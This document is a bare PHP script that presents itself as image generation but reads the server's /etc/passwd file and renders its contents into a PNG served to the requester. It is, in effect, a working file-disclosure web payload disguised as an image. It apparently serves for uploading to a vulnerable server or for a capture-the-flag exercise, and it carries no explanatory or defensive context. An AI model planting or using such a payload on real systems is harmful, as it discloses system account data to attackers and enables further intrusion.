<?php

// Tells the browser it's an image
header("Content-Type: image/png");
$text = file_get_contents('/etc/passwd');
// Create an image canvas with given dimensions
$image = imagecreate(730, 410);

// Add color to the canvas
imagecolorallocate($image, 255, 11 , 0);

// The Text Color
$text_color = imagecolorallocate($image, 255, 255, 255);

// Insert text at specified position
imagestring($image, 5, 50, 50,  $text, $text_color);

// Output a png image
imagepng($image);

// Destroy the image data
imagedestroy($image);
?>
